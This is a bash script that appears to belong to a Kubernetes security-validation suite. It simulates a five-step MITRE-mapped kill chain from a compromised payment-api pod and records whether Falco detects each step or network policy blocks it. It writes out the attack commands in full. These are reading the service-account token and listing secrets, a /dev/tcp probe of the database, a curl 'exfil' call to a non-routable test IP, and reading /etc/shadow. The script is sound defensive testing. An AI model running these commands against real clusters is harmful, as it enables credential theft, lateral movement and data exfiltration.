#!/usr/bin/env bash
# =============================================================================
# 05-bkash-scenario.sh — bKash Payment Infrastructure Kill-Chain Simulation
#
# MITRE ATT&CK (chain):
#   T1609  Container Administration Command    (Step 1 — initial access via exec)
#   T1552  Unsecured Credentials              (Step 2 — K8s secret enumeration)
#   T1021  Remote Services — Lateral Movement  (Step 3 — reach user-db)
#   T1041  Exfiltration over C2 Channel        (Step 4 — external egress)
#   T1003  OS Credential Dumping              (Step 5 — /etc/shadow read)
#
# Scenario storyline
# ------------------
# An adversary has obtained Remote Code Execution in the payment-api pod
# (modelled here as `kubectl exec`).  The simulation tests five kill-chain
# stages, validating that SecureCloud-BD controls block or detect each one.
#
# Expected outcome
# ----------------
#   Step 1  SIMULATED       — exec allowed (represents adversary's RCE entry)
#   Step 2  DETECTED        — Falco fires on secret-file read
#   Step 3  BLOCKED         — Egress NetworkPolicy / Istio blocks user-db
#   Step 4  BLOCKED         — Egress NetworkPolicy blocks external IP
#   Step 5  DETECTED        — Falco fires on /etc/shadow read
#
# Usage: bash attack-sim/scenarios/05-bkash-scenario.sh
# =============================================================================

set -uo pipefail
IFS=$'\n\t'

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
ORANGE='\033[0;33m'

SCENARIO_ID="05-bkash-scenario"
SCENARIO_NAME="bKash Payment Infrastructure Kill-Chain"
MITRE_CHAIN="T1609→T1552→T1021→T1041→T1003"

NS="${NS:-securecloud}"
SIEM_NS="${SIEM_NS:-siem}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RESULTS_DIR="${SCRIPT_DIR}/../results"

PAYMENT_API_APP="${PAYMENT_API_APP:-securecloud-api}"
USER_DB_APP="${USER_DB_APP:-user-db}"
USER_DB_PORT="${USER_DB_PORT:-5432}"
EXTERNAL_IP="${EXTERNAL_IP:-203.0.113.1}"    # TEST-NET-3 (RFC 5737) — non-routable
CONN_TIMEOUT="${CONN_TIMEOUT:-5}"
DETECTION_WAIT="${DETECTION_WAIT:-10}"

TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
RESULT_FILE="${RESULTS_DIR}/${SCENARIO_ID}-${TIMESTAMP}.txt"

# Kill-chain tracking
declare -A KC_STATUS=()
declare -A KC_DETECTED=()
declare -A KC_TIME=()
TOTAL_KC=5

# ---------------------------------------------------------------------------
check_prereqs() {
    command -v kubectl &>/dev/null || { echo -e "${RED}kubectl required${RESET}" >&2; exit 1; }
}

find_pod() {
    local app_label="$1"
    kubectl get pod -n "${NS}" \
        -l "app=${app_label}" \
        --field-selector=status.phase=Running \
        -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true
}

kexec() {
    local pod="$1"; shift
    kubectl exec -n "${NS}" "${pod}" -- sh -c "$*" 2>&1 || true
}

check_falco_for_step() {
    local since_iso="$1" pattern="$2"
    kubectl logs -n "${SIEM_NS}" \
        -l app.kubernetes.io/name=falco \
        --since-time="${since_iso}" 2>/dev/null \
        | grep -Ec "${pattern}" 2>/dev/null || echo 0
}

record_kc_step() {
    local step="$1" name="$2" status="$3" detected="$4" detail="$5"
    local ts; ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    KC_STATUS["${step}"]="${status}"
    KC_DETECTED["${step}"]="${detected}"
    KC_TIME["${step}"]="${ts}"
    {
        echo ""
        echo "KC_STEP_${step}_NAME: ${name}"
        echo "KC_STEP_${step}_STATUS: ${status}"
        echo "KC_STEP_${step}_DETECTED: ${detected}"
        echo "KC_STEP_${step}_TIME: ${ts}"
        echo "KC_STEP_${step}_DETAIL: ${detail}"
    } >> "${RESULT_FILE}"
}

init_results() {
    mkdir -p "${RESULTS_DIR}"
    {
        echo "SECURECLOUD_RESULT_V1"
        echo "SCENARIO_ID: ${SCENARIO_ID}"
        echo "SCENARIO_NAME: ${SCENARIO_NAME}"
        echo "MITRE_CHAIN: ${MITRE_CHAIN}"
        echo "START_TIME: ${START_ISO}"
        echo "PIVOT_POD: ${PIVOT_POD}"
        echo "NAMESPACE: ${NS}"
        echo "CATEGORY: kill-chain"
        echo "SEVERITY: CRITICAL"
        echo "TOTAL_KILL_CHAIN_STEPS: ${TOTAL_KC}"
        echo "---"
    } > "${RESULT_FILE}"
}

# ---------------------------------------------------------------------------
main() {
    echo -e "${BOLD}"
    echo -e "╔═══════════════════════════════════════════════════════════╗"
    echo -e "║   SecureCloud-BD  |  Scenario ${SCENARIO_ID}         ║"
    echo -e "║   ${SCENARIO_NAME}          ║"
    echo -e "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"

    check_prereqs

    PIVOT_POD="$(find_pod "${PAYMENT_API_APP}")"
    if [[ -z "${PIVOT_POD}" ]]; then
        PIVOT_POD="$(kubectl get pod -n "${NS}" \
            --field-selector=status.phase=Running \
            -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
        [[ -n "${PIVOT_POD}" ]] || {
            echo -e "${RED}No running pod in namespace ${NS}.${RESET}" >&2; exit 1
        }
        echo -e "${YELLOW}payment-api pod not found by label — using: ${PIVOT_POD}${RESET}"
    fi

    echo -e "${CYAN}Pivot pod (compromised): ${PIVOT_POD}${RESET}"
    echo -e "${CYAN}External C2 IP         : ${EXTERNAL_IP} (RFC 5737 non-routable)${RESET}\n"

    START_EPOCH="$(date +%s)"
    START_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    init_results

    # ═══════════════════════════════════════════════════════════════════════
    # STEP 1 — INITIAL ACCESS via kubectl exec (T1609)
    # ═══════════════════════════════════════════════════════════════════════
    echo -e "${ORANGE}${BOLD}▶ [Step 1 / T1609] INITIAL ACCESS — exec into payment-api${RESET}"
    STEP1_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    STEP1_OUT="$(kexec "${PIVOT_POD}" 'echo "EXEC_OK: $(id) on $(hostname)"')"

    if echo "${STEP1_OUT}" | grep -q "EXEC_OK"; then
        STEP1_STATUS="SIMULATED"
        STEP1_LABEL="${GREEN}SIMULATED (models adversary RCE entry point)${RESET}"
        echo -e "  ${GREEN}✓ Pod exec successful — adversary foothold established${RESET}"
        echo -e "  ${CYAN}  ${STEP1_OUT}${RESET}"
    else
        STEP1_STATUS="FAILED"
        STEP1_LABEL="${RED}FAILED (pod not accessible)${RESET}"
        echo -e "  ${RED}✗ exec failed: ${STEP1_OUT}${RESET}"
    fi

    # Falco fires on shell-in-container
    sleep 3
    STEP1_FALCO="$(check_falco_for_step "${STEP1_ISO}" "shell|exec|Run shell")"
    STEP1_DETECTED="$( [[ "${STEP1_FALCO}" -gt 0 ]] && echo "DETECTED" || echo "UNDETECTED" )"
    record_kc_step 1 "Initial Access — exec into ${PIVOT_POD}" \
        "${STEP1_STATUS}" "${STEP1_DETECTED}" "${STEP1_OUT:0:120}"
    [[ "${STEP1_FALCO}" -gt 0 ]] \
        && echo -e "  ${GREEN}  Falco: shell-in-container DETECTED (${STEP1_FALCO} alerts)${RESET}" \
        || echo -e "  ${YELLOW}  Falco: no shell-in-container alert (add 'Run shell in container' rule)${RESET}"

    # ═══════════════════════════════════════════════════════════════════════
    # STEP 2 — DISCOVERY: Kubernetes secret & token enumeration (T1552)
    # ═══════════════════════════════════════════════════════════════════════
    echo -e "\n${ORANGE}${BOLD}▶ [Step 2 / T1552] DISCOVERY — Secret & token enumeration${RESET}"
    STEP2_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

    # Read the service account token (Falco: Read sensitive file)
    STEP2_TOKEN="$(kexec "${PIVOT_POD}" \
        'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 40 && echo "..." || echo "NO_TOKEN"')"

    # Read namespace and CA
    STEP2_NS="$(kexec "${PIVOT_POD}" \
        'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "MISSING"')"

    # Attempt Kubernetes API enumeration using the token
    STEP2_API="$(kexec "${PIVOT_POD}" "
        TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        if [ -n \"\${TOKEN}\" ]; then
            curl -sk -H \"Authorization: Bearer \${TOKEN}\" \
                https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets \
                2>&1 | head -c 200
        else
            echo 'NO_TOKEN'
        fi
    ")"

    echo -e "  ${CYAN}SA token prefix: ${STEP2_TOKEN:0:40}…${RESET}"
    echo -e "  ${CYAN}Namespace      : ${STEP2_NS}${RESET}"

    if echo "${STEP2_API}" | grep -qi '"kind":"SecretList"\|"secrets"'; then
        echo -e "  ${RED}⚠ Kubernetes API returned secret list — RBAC may be too permissive${RESET}"
        STEP2_STATUS="SECRETS_EXPOSED"
    elif echo "${STEP2_API}" | grep -qi '"403"\|Forbidden\|403'; then
        echo -e "  ${GREEN}✓ API returned 403 — RBAC correctly restricts secret access${RESET}"
        STEP2_STATUS="RBAC_BLOCKED"
    else
        STEP2_STATUS="PARTIAL"
        echo -e "  ${YELLOW}  API response: ${STEP2_API:0:120}${RESET}"
    fi

    sleep "${DETECTION_WAIT}"
    STEP2_FALCO="$(check_falco_for_step "${STEP2_ISO}" "sensitive|secret|token|credential")"
    STEP2_DETECTED="$( [[ "${STEP2_FALCO}" -gt 0 ]] && echo "DETECTED" || echo "UNDETECTED" )"
    record_kc_step 2 "Secret & token enumeration" \
        "${STEP2_STATUS}" "${STEP2_DETECTED}" "API_RESULT=${STEP2_API:0:80}"
    [[ "${STEP2_FALCO}" -gt 0 ]] \
        && echo -e "  ${GREEN}  Falco: secret-read DETECTED (${STEP2_FALCO} alerts)${RESET}" \
        || echo -e "  ${YELLOW}  Falco: no sensitive-file-read alert${RESET}"

    # ═══════════════════════════════════════════════════════════════════════
    # STEP 3 — LATERAL MOVEMENT: reach user-db directly (T1021)
    # ═══════════════════════════════════════════════════════════════════════
    echo -e "\n${ORANGE}${BOLD}▶ [Step 3 / T1021] LATERAL MOVEMENT — payment-api → user-db${RESET}"
    STEP3_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

    STEP3_RAW="$(kexec "${PIVOT_POD}" "
        timeout ${CONN_TIMEOUT} bash -c '(echo >/dev/tcp/${USER_DB_APP}/${USER_DB_PORT}) 2>&1' \
        && echo 'DB_REACHABLE' || echo 'DB_UNREACHABLE'
    ")"

    if echo "${STEP3_RAW}" | grep -q "DB_REACHABLE"; then
        STEP3_STATUS="ALLOWED"
        echo -e "  ${RED}⚠ user-db IS reachable from payment-api — validate Istio AuthorizationPolicy${RESET}"
    else
        STEP3_STATUS="BLOCKED"
        echo -e "  ${GREEN}✓ NetworkPolicy/Istio BLOCKED direct user-db access${RESET}"
    fi

    record_kc_step 3 "Lateral movement to user-db:${USER_DB_PORT}" \
        "${STEP3_STATUS}" "N/A" "${STEP3_RAW:0:80}"

    # ═══════════════════════════════════════════════════════════════════════
    # STEP 4 — EXFILTRATION: external egress attempt (T1041)
    # ═══════════════════════════════════════════════════════════════════════
    echo -e "\n${ORANGE}${BOLD}▶ [Step 4 / T1041] EXFILTRATION — curl to external C2 IP${RESET}"
    STEP4_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo -e "  ${CYAN}Target: ${EXTERNAL_IP} (RFC 5737 non-routable — safe to probe)${RESET}"

    STEP4_RAW="$(kexec "${PIVOT_POD}" "
        curl --connect-timeout ${CONN_TIMEOUT} -s \
            -o /dev/null -w '%{http_code}' \
            http://${EXTERNAL_IP}/exfil 2>&1 || echo 'CURL_FAILED'
    ")"

    if echo "${STEP4_RAW}" | grep -qE "^[2345][0-9][0-9]$"; then
        STEP4_STATUS="ALLOWED"
        echo -e "  ${RED}⚠ External egress ALLOWED (HTTP ${STEP4_RAW}) — egress NetworkPolicy missing${RESET}"
    else
        STEP4_STATUS="BLOCKED"
        echo -e "  ${GREEN}✓ Egress NetworkPolicy BLOCKED external connection (${STEP4_RAW})${RESET}"
    fi

    record_kc_step 4 "External egress to C2 (${EXTERNAL_IP})" \
        "${STEP4_STATUS}" "N/A" "curl_rc=${STEP4_RAW}"

    # ═══════════════════════════════════════════════════════════════════════
    # STEP 5 — PRIVILEGE ESCALATION: read /etc/shadow (T1003)
    # ═══════════════════════════════════════════════════════════════════════
    echo -e "\n${ORANGE}${BOLD}▶ [Step 5 / T1003] PRIVILEGE ESCALATION — read /etc/shadow${RESET}"
    STEP5_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

    STEP5_OUT="$(kexec "${PIVOT_POD}" 'cat /etc/shadow 2>&1 | head -3')"

    if echo "${STEP5_OUT}" | grep -qE "root:|No such|Permission"; then
        STEP5_STATUS="EXECUTED"
        echo -e "  ${RED}⚡ /etc/shadow read attempted — content: ${STEP5_OUT:0:60}${RESET}"
    else
        STEP5_STATUS="FAILED"
        echo -e "  ${CYAN}  /etc/shadow not accessible: ${STEP5_OUT:0:80}${RESET}"
    fi

    sleep "${DETECTION_WAIT}"
    STEP5_FALCO="$(check_falco_for_step "${STEP5_ISO}" "shadow|sensitive|Read sensitive")"
    STEP5_DETECTED="$( [[ "${STEP5_FALCO}" -gt 0 ]] && echo "DETECTED" || echo "UNDETECTED" )"
    record_kc_step 5 "Read /etc/shadow (credential dump)" \
        "${STEP5_STATUS}" "${STEP5_DETECTED}" "${STEP5_OUT:0:80}"
    [[ "${STEP5_FALCO}" -gt 0 ]] \
        && echo -e "  ${GREEN}  Falco: /etc/shadow read DETECTED (${STEP5_FALCO} alerts)${RESET}" \
        || echo -e "  ${YELLOW}  Falco: no sensitive-file alert for /etc/shadow${RESET}"

    # ═══════════════════════════════════════════════════════════════════════
    # KILL-CHAIN DIAGRAM
    # ═══════════════════════════════════════════════════════════════════════
    END_EPOCH="$(date +%s)"
    END_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    TOTAL_DURATION=$(( END_EPOCH - START_EPOCH ))

    # Count how many steps were blocked or detected
    CONTROLLED=0
    for s in 2 3 4 5; do
        local st="${KC_STATUS[$s]:-?}" dt="${KC_DETECTED[$s]:-?}"
        [[ "${st}" == "BLOCKED" ]] || [[ "${dt}" == "DETECTED" ]] \
            && (( CONTROLLED++ )) || true
    done

    echo -e "\n"
    echo -e "${BOLD}╔══════════════════════════════════════════════════════════════╗"
    echo -e "║          K I L L - C H A I N   D I A G R A M               ║"
    echo -e "║     bKash Payment Infrastructure Compromise Scenario        ║"
    echo -e "╠══════════════════════════════════════════════════════════════╣${RESET}"

    # Helper: format each row
    _row() {
        local step="$1" tactic="$2" action="$3" outcome="$4" note="$5"
        local colour
        case "${outcome}" in
            BLOCKED|RBAC_BLOCKED) colour="${GREEN}" ;;
            DETECTED)             colour="${YELLOW}" ;;
            SIMULATED|EXECUTED|SECRETS_EXPOSED|ALLOWED) colour="${RED}" ;;
            *)                    colour="${CYAN}" ;;
        esac
        printf "${BOLD}║${RESET}  %-2s  %-14s  %-34s  ${colour}%-9s${RESET}  ${CYAN}%-12s${RESET}  ${BOLD}║${RESET}\n" \
            "${step}" "${tactic}" "${action}" "${outcome}" "${note}"
    }

    printf "${BOLD}║${RESET}  %-2s  %-14s  %-34s  %-9s  %-12s  ${BOLD}║${RESET}\n" \
        "#" "Tactic" "Action" "Outcome" "Control"
    printf "${BOLD}║${RESET}  %-2s  %-14s  %-34s  %-9s  %-12s  ${BOLD}║${RESET}\n" \
        "--" "--------------" "----------------------------------" "---------" "------------"

    _row "1" "T1609 InitAcc" "kubectl exec payment-api" \
        "${KC_STATUS[1]:-?}" \
        "$( [[ "${KC_DETECTED[1]}" == "DETECTED" ]] && echo "Falco✓" || echo "—" )"

    _row "2" "T1552 Discov" "Read SA token + K8s API enum" \
        "${KC_STATUS[2]:-?}" \
        "$( [[ "${KC_DETECTED[2]}" == "DETECTED" ]] && echo "Falco✓" || echo "RBAC" )"

    _row "3" "T1021 LatMov" "payment-api → user-db:5432" \
        "${KC_STATUS[3]:-?}" \
        "NetPol/Istio"

    _row "4" "T1041 Exfil" "curl ${EXTERNAL_IP}/exfil" \
        "${KC_STATUS[4]:-?}" \
        "EgressPol"

    _row "5" "T1003 PrivEsc" "cat /etc/shadow" \
        "${KC_STATUS[5]:-?}" \
        "$( [[ "${KC_DETECTED[5]}" == "DETECTED" ]] && echo "Falco✓" || echo "—" )"

    echo -e "${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${BOLD}║${RESET}  Steps blocked or detected : ${CONTROLLED} / 4 (post-entry)              ${BOLD}║${RESET}"
    echo -e "${BOLD}║${RESET}  Simulation duration       : ${TOTAL_DURATION}s                              ${BOLD}║${RESET}"

    if [[ "${STEP3_STATUS}" == "BLOCKED" ]]; then
        echo -e "${BOLD}║${RESET}  ${GREEN}Kill-chain BROKEN at Step 3 — lateral movement denied       ${BOLD}║${RESET}"
    elif [[ "${STEP4_STATUS}" == "BLOCKED" ]]; then
        echo -e "${BOLD}║${RESET}  ${GREEN}Kill-chain BROKEN at Step 4 — exfiltration denied          ${BOLD}║${RESET}"
    else
        echo -e "${BOLD}║${RESET}  ${RED}Kill-chain NOT broken — review NetworkPolicy configuration  ${BOLD}║${RESET}"
    fi
    echo -e "${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"

    TOTAL_FALCO=$(( ${STEP1_FALCO:-0} + ${STEP2_FALCO:-0} + ${STEP5_FALCO:-0} ))
    DETECTION_STATUS="$( [[ "${TOTAL_FALCO}" -gt 0 || "${STEP3_STATUS}" == "BLOCKED" ]] \
        && echo DETECTED || echo UNDETECTED )"

    {
        echo ""
        echo "=== SUMMARY ==="
        echo "STEPS_CONTROLLED: ${CONTROLLED}"
        echo "TOTAL_FALCO_ALERTS: ${TOTAL_FALCO}"
        echo "KILL_CHAIN_BROKEN_AT: $( [[ "${STEP3_STATUS}" == "BLOCKED" ]] && echo "Step3" || ( [[ "${STEP4_STATUS}" == "BLOCKED" ]] && echo "Step4" || echo "NOT_BROKEN" ) )"
        echo "DETECTION_STATUS: ${DETECTION_STATUS}"
        echo "MTTD_SECONDS: ${DETECTION_WAIT}"
        echo "SCENARIO_DURATION_SECONDS: ${TOTAL_DURATION}"
        echo "END_TIME: ${END_ISO}"
        echo "FALCO_ALERT_COUNT: ${TOTAL_FALCO}"
    } >> "${RESULT_FILE}"

    sed -i "/^---$/i DETECTION_STATUS: ${DETECTION_STATUS}\nFALCO_ALERT_COUNT: ${TOTAL_FALCO}\nMTTD_SECONDS: ${DETECTION_WAIT}\nSTEPS_CONTROLLED: ${CONTROLLED}" \
        "${RESULT_FILE}" 2>/dev/null || true

    echo -e "\n${CYAN}Results → ${RESULT_FILE}${RESET}"
}

main "$@"
